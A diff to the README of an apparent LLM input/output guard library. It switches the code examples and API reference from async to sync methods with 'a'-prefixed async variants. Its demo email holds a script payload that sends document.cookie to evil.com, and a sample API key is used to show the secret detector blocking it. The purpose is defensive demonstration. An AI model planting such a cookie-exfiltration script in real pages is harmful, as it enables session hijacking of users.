@@ -51,27 +51,22 @@ uv sync --all-extras
 An incoming email contains a script injection. The `HtmlSanitizer` strips it and flags the content:
 
 ```python
-import asyncio
-
-from llm_io_guard import Action, InputFilter
+from llm_io_guard import InputFilter
 from llm_io_guard.scanners.html_sanitizer import HtmlSanitizer
 
-async def main():
-    email = (
-        '<p>Hi team,</p><p>Meeting at 10am.</p>'
-        '<script>fetch("https://evil.com/steal?d="+document.cookie)</script>'
-        '<img src=x onerror="alert(1)">'
-    )
+email = (
+    '<p>Hi team,</p><p>Meeting at 10am.</p>'
+    '<script>fetch("https://evil.com/steal?d="+document.cookie)</script>'
+    '<img src=x onerror="alert(1)">'
+)
 
-    input_filter = InputFilter()
-    input_filter.add(HtmlSanitizer())
-    result = await input_filter.filter(email)
+input_filter = InputFilter()
+input_filter.add(HtmlSanitizer())
+result = input_filter.filter(email)
 
-    print(f"Action:     {result.action.value}")
-    print(f"Safe text:  {result.text!r}")
-    print(f"Flagged by: {[r.scanner_name for r in result.flagged_by]}")
-
-asyncio.run(main())
+print(f"Action:     {result.action.value}")
+print(f"Safe text:  {result.text!r}")
+print(f"Flagged by: {[r.scanner_name for r in result.flagged_by]}")
 ```
 
 ```
@@ -89,27 +84,22 @@ An LLM response accidentally includes an API key. The `PiiDetector` catches it:
 > Requires: `pip install llm-io-guard[pii]` and `python -m spacy download en_core_web_lg`
 
 ```python
-import asyncio
-
 from llm_io_guard import OutputFilter
 from llm_io_guard.scanners.pii_detector import PiiDetector
 
-async def main():
-    llm_response = (
-        "Here are the deployment settings:\n"
-        "  API_KEY=sk-proj-abc123def456ghi789jkl012mno345p\n"
-        "  REGION=us-east-1"
-    )
+llm_response = (
+    "Here are the deployment settings:\n"
+    "  API_KEY=sk-proj-abc123def456ghi789jkl012mno345p\n"
+    "  REGION=us-east-1"
+)
 
-    output_filter = OutputFilter()
-    output_filter.add(PiiDetector())
-    result = await output_filter.filter(llm_response)
+output_filter = OutputFilter()
+output_filter.add(PiiDetector())
+result = output_filter.filter(llm_response)
 
-    print(f"Action:     {result.action.value}")
-    print(f"Blocked by: {[r.scanner_name for r in result.blocked_by]}")
-    print(f"Reason:     {result.blocked_by[0].description}")
-
-asyncio.run(main())
+print(f"Action:     {result.action.value}")
+print(f"Blocked by: {[r.scanner_name for r in result.blocked_by]}")
+print(f"Reason:     {result.blocked_by[0].description}")
 ```
 
 ```
@@ -119,6 +109,8 @@ Reason:     Secret(s) detected: SECRET_API_KEY
 ```
 
 The scanner returned **BLOCK**, preventing the API key from reaching the user or downstream system. BLOCK results short-circuit the pipeline -- no further scanners run.
+
+> **Async usage:** All methods have async counterparts with an `a` prefix. Use `await input_filter.afilter(email)` instead of `input_filter.filter(email)` in async contexts.
 
 ## Architecture
 
@@ -302,15 +294,18 @@ make clean
 ### `InputFilter` / `OutputFilter`
 Builder-pattern filter classes. Orchestrate tiered scanning with fail-fast behavior.
 - `add(scanner: Scanner)` -- register a scanner (validates direction compatibility)
-- `async filter(content: str) -> FilterResult` -- run content through the tiered pipeline
+- `filter(content: str) -> FilterResult` -- run content through the tiered pipeline (sync)
+- `async afilter(content: str) -> FilterResult` -- run content through the tiered pipeline (async)
 
 ### `Scanner`
 Abstract base class for all content scanners. Extend this to add custom scanners.
 - `name: str` -- unique identifier (abstract property)
 - `tier: int` -- execution tier 1/2/3 (abstract property)
 - `supported_directions: frozenset[str]` -- `"input"`, `"output"`, or both
-- `async scan(content, metadata) -> ScanResult` -- perform the scan (abstract)
-- `async initialize()` -- optional async initialization
+- `scan(content, metadata) -> ScanResult` -- perform the scan (sync)
+- `async ascan(content, metadata) -> ScanResult` -- perform the scan (async, abstract)
+- `initialize()` -- optional initialization (sync)
+- `async ainitialize()` -- optional async initialization
 
 ### Data Classes
 - `Action` -- enum: `PASS`, `FLAG`, `BLOCK`
@@ -321,7 +316,8 @@ Abstract base class for all content scanners. Extend this to add custom scanners
 ### Action Validation
 - `ActionRequest` -- represents an agent action request with category and risk level
 - `ActionCategory` -- enum: `READ`, `NOTIFY`, `CREATE`, `MODIFY`, `DELETE`, `SEND`, `EXECUTE`
-- `async validate_action(action, confirm_callback)` -- validate whether an agent action should be executed
+- `validate_action(action, confirm_callback)` -- validate whether an agent action should be executed (sync)
+- `async avalidate_action(action, confirm_callback)` -- validate whether an agent action should be executed (async)
 
 ### Rate Limiting
 - `RateLimiter` -- token-bucket rate limiter with `max_requests_per_minute` and `max_cost_per_day_usd`
